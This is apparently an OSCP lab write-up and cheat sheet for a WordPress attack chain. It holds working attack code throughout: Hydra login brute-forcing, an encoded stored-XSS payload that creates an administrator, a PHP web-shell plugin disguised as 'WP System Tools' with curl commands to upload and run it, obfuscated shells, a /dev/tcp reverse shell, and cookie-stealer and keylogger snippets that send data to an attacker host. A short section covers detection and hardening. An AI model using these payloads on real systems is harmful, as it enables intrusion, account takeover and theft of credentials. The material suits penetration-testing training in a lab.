# WordPress XSS Attack Chain - Complete Reference Guide

## Executive Summary
This guide documents a complete WordPress XSS privilege escalation attack chain, demonstrating exploitation from initial reconnaissance through full system compromise via malicious plugin upload. Based on real exploitation of WordPress Visitors plugin vulnerability.

---

## 1. Attack Overview

### Target Environment
- **Platform:** WordPress 5.8.3
- **Vulnerable Plugin:** Visitors/Traffic Logger
- **Target IP:** 192.168.187.16 (offsecwp)
- **Attack Vector:** Stored XSS in HTTP headers
- **End Goal:** Administrative access and system compromise

### Attack Impact
- Privilege escalation to WordPress admin
- Arbitrary code execution via web shell
- Full file system access
- Data exfiltration capability

### Prerequisites
- Target must log visitor data (User-Agent, X-Forwarded-For)
- Admin must view logged data (trigger XSS)
- WordPress installation accessible

---

## 2. Complete Attack Chain Execution

### Phase 1: Password Cracking
```bash
# Initial password attack using Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt offsecwp \
  http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" \
  -t 64

# Result: admin/password
# -l admin: Target username
# -P: Password wordlist
# -t 64: 64 parallel threads for speed
# F=incorrect: Failure indicator string
```

### Phase 2: XSS Payload Creation

#### Original JavaScript Payload (`xss_payload.js`)
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=pentester&email=pentester@oscp.local&pass1=OscpPass123!&pass2=OscpPass123!&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

#### Minified Version
```javascript
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=pentester&email=pentester@oscp.local&pass1=OscpPass123!&pass2=OscpPass123!&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

#### Encoding Function
```javascript
function encode_to_javascript(string) {
    var input = string
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}
```

#### Encoded Payload (Character Codes)
```
118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,112,101,110,116,101,115,116,101,114,38,101,109,97,105,108,61,112,101,110,116,101,115,116,101,114,64,111,115,99,112,46,108,111,99,97,108,38,112,97,115,115,49,61,79,115,99,112,80,97,115,115,49,50,51,33,38,112,97,115,115,50,61,79,115,99,112,80,97,115,115,49,50,51,33,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59
```

### Phase 3: XSS Payload Delivery
```bash
# Deliver via User-Agent header (stored XSS)
curl -i http://offsecwp \
  --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,112,101,110,116,101,115,116,101,114,38,101,109,97,105,108,61,112,101,110,116,101,115,116,101,114,64,111,115,99,112,46,108,111,99,97,108,38,112,97,115,115,49,61,79,115,99,112,80,97,115,115,49,50,51,33,38,112,97,115,115,50,61,79,115,99,112,80,97,115,115,49,50,51,33,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" \
  --proxy 127.0.0.1:8080
# -i: Include HTTP response headers in output
# --user-agent: Set custom User-Agent header (contains XSS payload)
# --proxy: Route through Burp Suite proxy for inspection/debugging

# Alternative: X-Forwarded-For header
curl -i http://offsecwp \
  -H "X-Forwarded-For: <script>eval(String.fromCharCode(...))</script>"
# -H: Add custom HTTP header (X-Forwarded-For commonly logged)
```

### Phase 4: Malicious Plugin Creation
```bash
# Create web shell plugin
cat > /tmp/wp-shell.php << 'EOF'
<?php
/**
 * Plugin Name: WP System Tools
 * Description: System maintenance utilities
 * Version: 1.0
 * Author: Administrator
 */

if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
    die();
}
?>
EOF
# cat: Display file contents (used with > for writing)
# >: Redirect output to file (creates/overwrites)
# <<'EOF': Heredoc delimiter for multi-line input
# 'EOF': Quoted to prevent variable expansion

# Create plugin ZIP archive
cd /tmp && zip -q wp-shell.zip wp-shell.php
# cd /tmp: Change to temporary directory
# &&: Execute next command only if previous succeeds
# zip: Create compressed archive
# -q: Quiet mode (suppress output)
```

### Phase 5: Command-Line Plugin Upload & Activation

#### Step 1: Establish Session
```bash
# Get test cookie first
curl -s -c /tmp/wp_cookies.txt http://192.168.187.16/wp-login.php > /dev/null
# -s: Silent mode (no progress bar)
# -c: Save cookies to file
# > /dev/null: Discard HTML output

# Login with credentials
curl -s -b /tmp/wp_cookies.txt -c /tmp/wp_cookies2.txt -L \
  -d "log=admin&pwd=password&wp-submit=Log+In&redirect_to=http://192.168.187.16/wp-admin/&testcookie=1" \
  http://192.168.187.16/wp-login.php
# -b: Read cookies from file
# -c: Write new cookies to file
# -L: Follow redirects
# -d: POST data (form fields)
```

#### Step 2: Extract Upload Nonce
```bash
# Get nonce from plugin upload page
NONCE=$(curl -s -b /tmp/wp_cookies2.txt \
  "http://192.168.187.16/wp-admin/plugin-install.php?tab=upload" \
  | grep -oP '_wpnonce" value="\K[^"]+' | head -1)
# grep -o: Output only matching part
# -P: Perl regex mode
# \K: Reset match start (exclude prefix)
# [^"]+: Match until quote
# head -1: First match only

echo "Nonce: $NONCE"
```

#### Step 3: Upload Plugin
```bash
# Upload plugin ZIP via curl
curl -s -b /tmp/wp_cookies2.txt \
  -F "pluginzip=@/tmp/wp-shell.zip" \
  -F "_wpnonce=$NONCE" \
  -F "_wp_http_referer=/wp-admin/plugin-install.php?tab=upload" \
  -F "install-plugin-submit=Install Now" \
  "http://192.168.187.16/wp-admin/update.php?action=upload-plugin"
# -F: Form field (multipart/form-data)
# @: Upload file from path
# _wpnonce: CSRF protection token
# _wp_http_referer: WordPress referrer check
```

#### Step 4: Activate Plugin
```bash
# Extract activation nonce from response
ACTIVATE_NONCE=$(curl -s -b /tmp/wp_cookies2.txt \
  "http://192.168.187.16/wp-admin/plugins.php" \
  | grep -oP 'action=activate&amp;plugin=wp-shell%2Fwp-shell\.php&amp;_wpnonce=\K[^"]+' \
  | head -1)
# &amp;: HTML entity for &
# %2F: URL encoded /
# \.: Escape literal dot

# Activate the plugin
curl -s -b /tmp/wp_cookies2.txt \
  "http://192.168.187.16/wp-admin/plugins.php?action=activate&plugin=wp-shell%2Fwp-shell.php&_wpnonce=$ACTIVATE_NONCE"
```

### Phase 6: Web Shell Exploitation

#### Basic Command Execution
```bash
# Test web shell
curl "http://192.168.187.16/wp-content/plugins/wp-shell/wp-shell.php?cmd=id"
# cmd=id: Execute 'id' command to show current user
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

# System information
curl "http://192.168.187.16/wp-content/plugins/wp-shell/wp-shell.php?cmd=uname+-a"
# uname -a: Display all system information
# +: URL encoding for space character

# List /tmp directory
curl "http://192.168.187.16/wp-content/plugins/wp-shell/wp-shell.php" \
  -G --data-urlencode "cmd=ls -la /tmp/"
# -G: Force GET request with data
# --data-urlencode: URL encode the parameter value
# ls -la: List all files with details
```

#### Flag Retrieval
```bash
# Find and read flag
curl "http://192.168.187.16/wp-content/plugins/wp-shell/wp-shell.php" \
  -G --data-urlencode "cmd=cat /tmp/flag"
# cat: Display file contents
# --data-urlencode: Handles special characters safely
# Output: OS{ff311c05a736905242a3122409a73de0}
```

---

## 3. Technical Analysis

### XSS Vulnerability Details
- **Vulnerable Component:** WordPress Visitors plugin
- **Vulnerable Headers:** User-Agent, X-Forwarded-For
- **Storage Type:** Database (visitor logs)
- **Trigger:** Admin viewing visitor statistics
- **Filter Bypass:** Character code encoding

### CSRF Token (Nonce) Bypass Mechanism
```javascript
// 1. Fetch admin page containing nonce
ajaxRequest.open("GET", requestURL, false);  // Synchronous request
ajaxRequest.send();

// 2. Extract nonce using regex
var nonceRegex = /ser" value="([^"]*?)"/g;
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

// 3. Include nonce in forged request
var params = "action=createuser&_wpnonce_create-user="+nonce+"..."
```

### Why Character Encoding Works
1. **Input Validation Bypass:** Filters check for `<script>` tags but not numeric arrays
2. **Runtime Decoding:** `String.fromCharCode()` converts at execution time
3. **Eval Execution:** Reconstructed JavaScript executed in victim's context
4. **Filter Evasion:** No suspicious keywords in initial payload

---

## 4. Alternative Approaches

### Different Encoding Methods
```javascript
// Base64 Encoding
<script>eval(atob('YWxlcnQoIlhTUyIp'))</script>

// Unicode Encoding
<script>\u0061\u006c\u0065\u0072\u0074('XSS')</script>

// Hex Encoding
<script>eval('\x61\x6c\x65\x72\x74\x28\x31\x29')</script>

// JSFuck (Obfuscation)
<script>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]...</script>
```

### Alternative Payload Delivery
```bash
# POST Request Body
curl -X POST http://target/comment.php \
  -d "comment=<script>eval(String.fromCharCode(...))</script>"
# -X POST: Specify HTTP method
# -d: POST data in request body

# Cookie Header
curl http://target/ \
  -H "Cookie: session=<script>eval(String.fromCharCode(...))</script>"
# -H: Set custom header
# Cookie: HTTP cookie header

# Referer Header
curl http://target/ \
  -H "Referer: <script>eval(String.fromCharCode(...))</script>"
# Referer: Previous page URL (often logged)
```

### Direct PHP Code Injection (If Upload Allowed)
```php
// Simple PHP web shell
<?php system($_GET['c']); ?>

// Obfuscated version
<?php @eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>

// Using assert
<?php assert($_REQUEST['c']); ?>
```

---

## 5. Detection & Prevention

### Defensive Measures
1. **Input Validation**
   - Sanitize ALL user input (headers, parameters, cookies)
   - Use allowlists, not blocklists
   - HTML entity encoding for output

2. **Content Security Policy (CSP)**
   ```html
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```

3. **HttpOnly Cookies**
   ```php
   setcookie("session", $value, 0, "/", "", true, true);
   // Last parameter enables HttpOnly
   ```

4. **X-XSS-Protection Header**
   ```
   X-XSS-Protection: 1; mode=block
   ```

### Log Monitoring Indicators
```bash
# Suspicious patterns in access logs
grep -E "<script|javascript:|onerror=|String\.fromCharCode" /var/log/apache2/access.log
# -E: Extended regex mode
# |: OR operator for multiple patterns

# Large User-Agent strings
awk 'length($12) > 500' /var/log/apache2/access.log
# length(): String length function
# $12: 12th field (User-Agent in combined log format)

# Unusual WordPress admin activity
grep "wp-admin/user-new.php" /var/log/apache2/access.log
# Monitor for user creation attempts
```

### WordPress Hardening
```php
// Disable file editing
define('DISALLOW_FILE_EDIT', true);

// Disable plugin/theme installation
define('DISALLOW_FILE_MODS', true);

// Force SSL for admin
define('FORCE_SSL_ADMIN', true);

// Limit login attempts (plugin recommended)
```

---

## 6. OSCP Exam Guidelines

### Documentation Requirements
1. **Initial Access**
   - Screenshot of vulnerable parameter/field
   - Proof of XSS trigger (alert box or console output)

2. **Exploitation Process**
   - Full payload with explanation
   - Burp Suite request/response
   - Evidence of privilege escalation

3. **Impact Demonstration**
   - New admin account creation
   - Web shell execution
   - System access proof

### Time-Efficient Workflow
```bash
# 1. Quick XSS test
curl "http://target/page?param=<script>alert(1)</script>"

# 2. If blocked, try encoding
curl "http://target/page?param=%3Cscript%3Ealert(1)%3C/script%3E"

# 3. If successful, escalate to admin creation
# 4. Upload web shell via admin panel
# 5. Enumerate and escalate
```

### Common Pitfalls to Avoid
- Don't forget to URL encode special characters
- Test payload in browser console first
- Verify admin account before attempting plugin upload
- Save all working payloads immediately
- Document each successful step

---

## 7. Quick Reference Sheet

### Essential Commands
```bash
# Password Cracking
hydra -l admin -P /usr/share/wordlists/rockyou.txt [TARGET] http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
# -l: Single username
# -P: Password wordlist path
# ^USER^/^PASS^: Placeholders for credentials
# F=incorrect: Login failure indicator

# XSS Delivery
curl -i http://[TARGET] --user-agent "<script>eval(String.fromCharCode([ENCODED]))</script>"
# -i: Include response headers
# --user-agent: Custom User-Agent header

# Session Management
curl -c cookies.txt -d "log=admin&pwd=password" http://[TARGET]/wp-login.php
# -c: Save cookies to file
# -d: POST form data

# Plugin Upload
curl -b cookies.txt -F "pluginzip=@plugin.zip" http://[TARGET]/wp-admin/update.php?action=upload-plugin
# -b: Use cookies from file
# -F: Multipart form upload
# @: File upload prefix

# Web Shell Access
curl "http://[TARGET]/wp-content/plugins/[PLUGIN]/shell.php?cmd=id"
# cmd=id: Command parameter for shell

# Reverse Shell
curl "[WEBSHELL]" -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/[IP]/4444 0>&1'"
# -G: GET with data
# --data-urlencode: URL encode special characters
# bash -i: Interactive bash
# >&: Redirect stdout and stderr
# /dev/tcp/: Bash TCP socket
```

### Payload Templates
```javascript
// Admin Creation (Customize credentials)
var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=[USER]&email=[EMAIL]&pass1=[PASS]&pass2=[PASS]&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);

// Cookie Stealer
new Image().src="http://[ATTACKER]/steal.php?c="+document.cookie;

// Keylogger
document.addEventListener('keypress',function(e){new XMLHttpRequest().open("GET","http://[ATTACKER]/log.php?k="+e.key,!0).send()});
```

---

## 8. Lab Verification Script

Create `verify_exploit.sh`:
```bash
#!/bin/bash

echo "=== WordPress XSS Exploitation Verification ==="
TARGET="192.168.187.16"
USERNAME="pentester"
PASSWORD="OscpPass123!"

# Test login
echo "[*] Testing created admin account..."
RESPONSE=$(curl -s -c /tmp/test_cookies.txt \
    -d "log=$USERNAME&pwd=$PASSWORD&wp-submit=Log+In" \
    "http://$TARGET/wp-login.php" -w "%{http_code}")
# -s: Silent mode
# -c: Save cookies
# -d: POST data
# -w: Format output (show HTTP code)

if curl -s -b /tmp/test_cookies.txt "http://$TARGET/wp-admin/" | grep -q "Dashboard"; then
    echo "[✓] SUCCESS: Admin account working!"
else
    echo "[✗] FAILED: Account not accessible"
fi
# -b: Use saved cookies
# grep -q: Quiet mode (exit code only)

# Test web shell
echo "[*] Testing web shell..."
if curl -s "http://$TARGET/wp-content/plugins/wp-shell/wp-shell.php?cmd=id" | grep -q "www-data"; then
    echo "[✓] SUCCESS: Web shell active!"
else
    echo "[✗] FAILED: Web shell not found"
fi

rm -f /tmp/test_cookies.txt
# rm -f: Force remove, no error if missing
```

---

## Key Takeaways

1. **Character encoding bypasses most XSS filters** - Numeric representation evades pattern matching
2. **CSRF tokens are useless against XSS** - JavaScript runs in authenticated context
3. **WordPress plugins = instant code execution** - Admin access enables system compromise
4. **Command-line automation saves time** - Browser not required for exploitation
5. **Stored XSS > Reflected XSS** - Persistent attack vector, automatic triggering
6. **Documentation is critical** - Screenshot everything for OSCP reporting

---

*Last Updated: OSCP Lab Exercise - WordPress XSS Privilege Escalation*
*Flag Retrieved: OS{ff311c05a736905242a3122409a73de0}*